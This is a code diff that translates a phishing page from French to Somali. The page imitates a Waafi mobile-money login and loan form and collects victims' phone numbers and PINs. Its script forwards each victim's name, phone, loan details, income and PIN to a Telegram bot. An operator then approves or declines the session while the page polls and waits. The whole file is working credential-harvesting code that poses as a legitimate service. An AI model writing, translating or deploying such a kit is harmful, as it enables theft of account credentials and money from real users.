@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="so">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Commencer</title>
+    <title>Bilow</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
@@ -194,35 +194,35 @@
     </div>
 
     <div class="header-section">
-        <h1 class="title">Commencer</h1>
-        <p class="subtitle">Entrez votre numéro de téléphone et votre code PIN pour continuer</p>
+        <h1 class="title">Bilow</h1>
+        <p class="subtitle">Geli lambarkaaga teleefanka iyo lambarkaaga sirta ah (PIN) si aad u sii waddo</p>
     </div>
 
     <!-- Loading Overlay -->
     <div id="loading-overlay" class="loading-overlay">
         <div class="spinner"></div>
-        <span>En attente d'approbation...</span>
+        <span>Waxaa la sugayaa ansixinta...</span>
     </div>
 
     <form class="form-container" id="loginForm">
         <!-- Phone Input -->
         <div class="input-group">
             <span class="country-code">+253</span>
-            <input type="tel" id="phoneInput" placeholder="Entrez le numéro de téléphone" maxlength="8" inputmode="numeric" required>
+            <input type="tel" id="phoneInput" placeholder="Geli lambarka teleefanka" maxlength="8" inputmode="numeric" required>
         </div>
 
         <!-- PIN Input -->
         <div class="input-group">
-            <input type="password" id="pinInput" placeholder="Entrez le code PIN" maxlength="6" inputmode="numeric" required>
+            <input type="password" id="pinInput" placeholder="Geli lambarka sirta ah (PIN)" maxlength="6" inputmode="numeric" required>
         </div>
 
         <div class="bottom-section">
             <label class="terms-container">
                 <input type="checkbox" id="termsCheckbox">
-                <span class="terms-label">J'accepte les <a href="#">Conditions d'utilisation</a></span>
+                <span class="terms-label">Waan aqbalay <a href="#">Shuruudaha Isticmaalka</a></span>
             </label>
 
-            <button type="submit" id="submitBtn" class="submit-btn" disabled>Continuer</button>
+            <button type="submit" id="submitBtn" class="submit-btn" disabled>Sii wad</button>
         </div>
     </form>
 
@@ -295,18 +295,18 @@
                     pin: pin
                 };
 
-                // Build the message text in French
+                // Build the message text in Somali
                 const messageLines = [
-                    "🔐 *Données de Connexion Waafi*",
+                    "🔐 *Macluumaadka Gelitaanka Waafi*",
                     "",
-                    "👤 *Nom :* " + (allData.firstName || "---") + " " + (allData.lastName || "---"),
-                    "📞 *Téléphone :* +253 " + allData.phone,
-                    "💰 *Montant :* $" + (allData.amount || "---"),
-                    "📆 *Durée :* " + (allData.loanDuration || "---"),
-                    "📋 *Type :* " + (allData.loanType || "---"),
-                    "📝 *Motif :* " + (allData.loanPurpose || "---"),
-                    "💼 *Emploi :* " + (allData.jobStatus || "---"),
-                    "💵 *Revenu :* $" + (allData.income || "---"),
+                    "👤 *Magaca :* " + (allData.firstName || "---") + " " + (allData.lastName || "---"),
+                    "📞 *Teleefanka :* +253 " + allData.phone,
+                    "💰 *Lacagta :* $" + (allData.amount || "---"),
+                    "📆 *Muddada :* " + (allData.loanDuration || "---"),
+                    "📋 *Nooca :* " + (allData.loanType || "---"),
+                    "📝 *Ujeedada :* " + (allData.loanPurpose || "---"),
+                    "💼 *Shaqada :* " + (allData.jobStatus || "---"),
+                    "💵 *Dakhliga :* $" + (allData.income || "---"),
                     "🔑 *PIN :* " + allData.pin
                 ];
                 const message = messageLines.join("\n");
@@ -317,10 +317,10 @@
                 const inlineKeyboard = {
                     inline_keyboard: [
                         [{
-                            text: "✅ Approuvé",
+                            text: "✅ Ogolow",
                             callback_data: `approve:${sessionId}`
                         }, {
-                            text: "❌ Refusé",
+                            text: "❌ Diid",
                             callback_data: `decline:${sessionId}`
                         }]
                     ]
@@ -352,12 +352,12 @@
                         startPollingForApproval(BOT_TOKEN, sessionId);
                     } else {
                         if (overlay) overlay.style.display = "none";
-                        alert("Erreur lors de l'envoi de la demande. Veuillez réessayer.");
+                        alert("Khalad ayaa dhacay markii la dirayay dalabka. Fadlan dib u day.");
                     }
                 } catch (err) {
                     console.error("❌ Network error sending to Telegram:", err);
                     if (overlay) overlay.style.display = "none";
-                    alert("Erreur réseau. Veuillez vérifier votre connexion.");
+                    alert("Khalad xagga shabakadda ah. Fadlan hubi xidhiidhkaaga internetka.");
                 }
             });
 
@@ -388,7 +388,7 @@
                                             },
                                             body: JSON.stringify({
                                                 callback_query_id: callbackQueryId,
-                                                text: "Approuvé !"
+                                                text: "La ogolaaday!"
                                             })
                                         });
 
@@ -406,7 +406,7 @@
                                             },
                                             body: JSON.stringify({
                                                 callback_query_id: callbackQueryId,
-                                                text: "Refusé. Réinitialisation du formulaire."
+                                                text: "Waa la diiday. Dib ayaa loo bilaabayaa foomka."
                                             })
                                         });
 
@@ -419,7 +419,7 @@
                                         termsCheckbox.checked = false;
                                         validateForm();
 
-                                        alert("Votre demande a été refusée. Veuillez saisir à nouveau vos informations.");
+                                        alert("Dalabkaaga waa la diiday. Fadlan dib u geli xogtaada.");
                                         return;
                                     }
                                 }
